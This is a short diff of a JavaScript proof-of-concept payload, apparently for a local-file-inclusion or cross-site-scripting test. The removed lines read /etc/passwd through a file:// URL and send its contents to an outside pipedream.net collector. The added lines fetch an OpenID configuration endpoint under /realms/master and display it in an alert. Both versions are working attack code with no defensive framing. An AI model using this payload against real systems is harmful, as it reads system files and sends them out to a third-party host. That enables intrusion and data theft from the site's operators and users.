@@ -1,6 +1,6 @@
-fetch('file:///etc/passwd')
-  .then(response => response.text())
-  .then(text => {
-    fetch('https://eoyo36fmz8facye.m.pipedream.net' + encodeURIComponent(text));  // Send file content to your server
+fetch('/realms/master/.well-known/openid-configuration')
+  .then(response => response.json())
+  .then(data => {
+    alert(JSON.stringify(data));  // Display internal config data
   })
   .catch(error => alert('LFI Failed: ' + error.message));
